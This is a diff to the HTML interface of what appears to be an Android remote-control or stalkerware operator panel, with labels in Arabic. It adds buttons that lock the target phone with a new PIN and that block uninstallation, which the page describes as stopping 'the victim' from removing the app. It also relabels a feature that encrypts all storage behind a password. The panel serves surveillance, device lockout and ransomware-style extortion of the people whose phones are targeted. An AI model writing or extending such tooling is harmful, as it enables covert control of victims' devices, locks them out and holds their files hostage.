@@ -220,7 +220,7 @@
             </div>
 
             <!-- ═══════════════════════════════════════════════════
-                 ⚡ قسم المميزات المتقدمة (جديد)
+                 ⚡ قسم المميزات المتقدمة
                  ═══════════════════════════════════════════════════ -->
             <div id="advancedTab" class="tab-pane">
                 <h3>⚡ المميزات المتقدمة</h3>
@@ -235,12 +235,42 @@
                         <h4 style="color:#ff4444;margin-bottom:10px;display:flex;align-items:center;gap:8px;">
                             <span style="font-size:22px;">🔒</span> قفل الجهاز
                         </h4>
-                        <p style="color:#888;font-size:12px;margin-bottom:15px;">
-                            يقفل شاشة الجهاز فوراً
+                        <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                            يقفل الشاشة ويغيّر الرمز (يحتاج Device Admin)
                         </p>
-                        <button onclick="advancedAction('lock_device')" style="width:100%;background:linear-gradient(135deg,#ff4444,#cc0000);color:#fff;border:none;padding:14px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:14px;box-shadow:0 0 15px rgba(255,68,68,0.4);">
-                            🔒 قفل الآن
+                        <input id="lockPinInput" type="tel" placeholder="PIN جديد (4+ أرقام)" maxlength="8" style="width:100%;padding:10px;background:#111;border:1px solid #ff4444;border-radius:6px;color:#fff;font-size:14px;text-align:center;letter-spacing:3px;margin-bottom:10px;font-family:inherit;">
+                        <div style="display:flex;gap:8px;">
+                            <button onclick="lockWithPin()" style="flex:1;background:linear-gradient(135deg,#ff4444,#cc0000);color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">
+                                🔐 قفل برمز
+                            </button>
+                            <button onclick="advancedAction('lock_device')" style="flex:1;background:#333;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">
+                                🔒 قفل بسيط
+                            </button>
+                        </div>
+                        <button onclick="advancedAction('unlock_device')" style="width:100%;margin-top:8px;background:#222;color:#00ff88;border:1px solid #00ff88;padding:10px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">
+                            🔓 إزالة الرمز
                         </button>
+                    </div>
+
+                    <!-- 🚫 منع إلغاء التثبيت -->
+                    <div style="background:#0a0a0a;border:2px solid #ff6b6b;border-radius:12px;padding:18px;">
+                        <h4 style="color:#ff6b6b;margin-bottom:10px;display:flex;align-items:center;gap:8px;">
+                            <span style="font-size:22px;">🚫</span> منع إلغاء التثبيت
+                        </h4>
+                        <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                            يمنع الضحية من حذف أو إلغاء تنشيط التطبيق
+                        </p>
+                        <div style="display:flex;gap:8px;">
+                            <button onclick="advancedAction('enable_uninstall_protection')" style="flex:1;background:linear-gradient(135deg,#ff6b6b,#cc0000);color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;box-shadow:0 0 12px rgba(255,107,107,0.4);">
+                                🚫 تفعيل الحماية
+                            </button>
+                            <button onclick="advancedAction('disable_uninstall_protection')" style="flex:1;background:#222;color:#ff6b6b;border:1px solid #ff6b6b;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">
+                                🔓 إيقاف الحماية
+                            </button>
+                        </div>
+                        <p style="color:#666;font-size:10px;margin-top:10px;text-align:center;">
+                            ⚠️ يحتاج Accessibility Service مفعّلة
+                        </p>
                     </div>
 
                     <!-- 🖱️ الضغط التلقائي -->
@@ -291,7 +321,7 @@
                             <span style="font-size:22px;">🔐</span> تشفير كل التخزين
                         </h4>
                         <p style="color:#888;font-size:12px;margin-bottom:12px;">
-                            ⚠️ يشفّر كل الملفات — لا يمكن الفك بدون كلمة المرور
+                            ⚠️ يشفّر كل الملفات (بدون فيديو) — لا يمكن الفك بدون كلمة المرور
                         </p>
                         <input id="encryptionPassword" type="password" placeholder="كلمة المرور (4+ أحرف)" style="width:100%;padding:10px;background:#111;border:1px solid #FFD700;border-radius:6px;color:#fff;font-size:13px;margin-bottom:10px;font-family:inherit;">
                         <div style="display:flex;gap:8px;">
@@ -413,4 +443,4 @@
     }
     </script>
 </body>
-</html>
+                </html>
